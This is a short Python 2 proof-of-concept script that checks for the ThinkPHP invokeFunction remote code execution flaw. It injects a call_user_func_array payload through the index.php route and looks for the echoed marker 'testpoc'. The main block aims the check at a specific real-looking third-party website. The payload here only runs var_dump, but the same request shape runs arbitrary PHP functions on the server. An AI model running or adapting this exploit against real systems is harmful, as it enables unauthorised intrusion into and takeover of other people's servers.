import urllib2


def poc(target):
    if target[-1] != '/':
        target += '/'
    target += 'index.php?s=index/\\think\Container/invokeFunction&function=call_user_func_array&vars[]=var_dump&vars[1][]=testpoc'
    try:
        res = urllib2.urlopen(target)
        res = res.read()
        if '"testpoc"' in res:
            return True
    except:
        pass
    return False


if __name__ == '__main__':
    print poc('https://www.52qy.top')
